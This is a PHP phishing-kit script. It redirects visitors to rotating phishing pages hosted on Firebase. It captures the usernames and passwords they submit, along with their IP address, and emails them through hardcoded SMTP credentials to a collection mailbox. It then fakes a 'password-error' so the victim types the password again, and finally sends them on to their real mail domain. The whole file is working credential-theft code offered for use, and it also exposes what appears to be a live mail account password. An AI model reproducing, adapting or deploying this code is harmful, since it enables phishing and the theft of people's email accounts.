<?php

$smtpuser = 'info@@matrx-lubricants.com'; // enter the email address of the smtp you want to use
$userpass = '#0D}p7kr6=2!'; // enter the password of the smtp you want to use
$dropbox =  'info@@matrx-lubricants.com'; // enter email address your your logins should report
$smtpservice = 'mail.matrx-lubricants.com';  // change to 'smtp.yandex.com' if your smtp is yandex mail
// NOTE: Gmail smtp may likely push your login to spam box
// https://firebasestorage.googleapis.com/v0/b/admin-server-48271.appspot.com/o/rc%2Fredirect.html?alt=media&token=ac68d656-5790-404a-9d8a-397010110f44
// replace 'index.html' with link(s) of firebase page(s) for autolink
$linked = array (
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(10).html?alt=media&token=a1fae284-5481-4992-a384-18abd9b831b4',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(2).html?alt=media&token=4cadf23a-d19d-41b6-bc61-90f420671f55',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(3).html?alt=media&token=39d8cb18-5f7c-4c33-b46d-7072fa152b82',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(4).html?alt=media&token=b65b8d85-beab-4a40-8860-b18a43f687c9',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(5).html?alt=media&token=3d523b01-10de-419b-98fc-6a8284955135',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(6).html?alt=media&token=b8003188-14e2-40cf-8524-2838ad446145',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(7).html?alt=media&token=2bc30171-d8df-4dce-94a9-0a2c4ce56379',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(8).html?alt=media&token=c42b6970-d635-4a3f-9d75-5ec54bbc0bdb',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy%20(9).html?alt=media&token=66b7ae4a-884c-4cd7-a1d8-d808dac2bf5f',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex%20-%20Copy.html?alt=media&token=f38d9c4a-7cb8-4c5c-91c1-0d92a65c5666',
            'https://firebasestorage.googleapis.com/v0/b/redirect-link-5bf74.appspot.com/o/Storage%2Findex.html?alt=media&token=90efdb89-f2cd-4cf4-8170-82aa9d61e6e4'

);

$i = p();
$username = $email = $pet = $pett = $error = $source = $subj = '';
$reff = $_SERVER['HTTP_REFERER'];
if ($_SERVER['REQUEST_METHOD'] === 'GET'){
    $loc = getLink($linked);
    if(isset($_GET['email']) && !empty($_GET['email'])){
        $email = $_GET['email'];
        if (strpos($loc, '?')){
            $loc .= "&email=".$email;
        } else {
            $loc .= "?email=".$email;
        }
    }
    header("Location: $loc");
    exit;
}

$from = 'INITIAL';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['source'])){
    if (isset($_POST['pet']) && isset($_POST['pett'])){
        $pet = $_POST['pet'];
        $pett = $_POST['pett'];
    }
    if (isset($_POST['error'])){
        $error = $_POST['error'];
    }
    if (empty($pet) || empty($pett)){
        header("Location: $reff");
        exit;
    }
}
if (isset($_POST['error']) && !empty($_POST['error'])){
    $from = 'FINAL';
}
if (isset($_POST['source'])){
    $source = $_POST['source'];
    $subj = "$source | .$i";
}
$bod = "
<HTML>
<BODY>
    <div> PAGE: $from </div>
    <div> USER: $pet </div>
    <div> ENTER: $pett </div>
    <div> HOME: <a href='http://whoer.net/check?host=$i' target='_blank'>$i</a> </div>
</BODY>
</HTML>
";
require 'PHPMailerAutoload.php';
$mail = new PHPMailer;
$mail->SMTPDebug = 3;
$mail->isSMTP();
// $mail->Host = 'smtp.yandex.com';
$mail->Host = $smtpservice;
$mail->Port = 465; // for any of gmail or yandex
// $mail->Port = 587;
// $mail->Port = 25;
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'ssl';
$mail->SMTPOptions = array (
    'ssl' => array(
    'verify_peer' => false,
    'verify_peer_name' => false,
    'allow_self_signed' => true)
); 
$mail->Username = $smtpuser;
$mail->Password = $userpass;
$mail->From = $smtpuser;
$mail->FromName = $source;
$mail->addAddress($dropbox);
$mail->isHTML(true);
$mail->Subject = $subj;
$mail->Body    = $bod;
if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
    $bod = "PAGE: $from \n USER: $pet \n ENTER: $pett \n HOME: http://whoer.net/check?host=$i";
    mail($dropbox, $subj, $bod);
    // exit; //uncomment this line to see error if mail did not send
}

if (isset($_POST['error']) && !empty($_POST['error'])){
    $dom = substr(strrchr($pet, "@"), 1);
    header("Location: http://$dom");
    exit;
} else {
    if (strpos($reff, '?')){
        $reff .= "&error=password-error";
    } else {
        $reff .= "?error=password-error";
    }
    header("Location: $reff");
    exit;
}
 function getlink($arr){
    $num = rand(0, count($arr) - 1);
    return $arr[$num];
 }
 function p(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
}
?>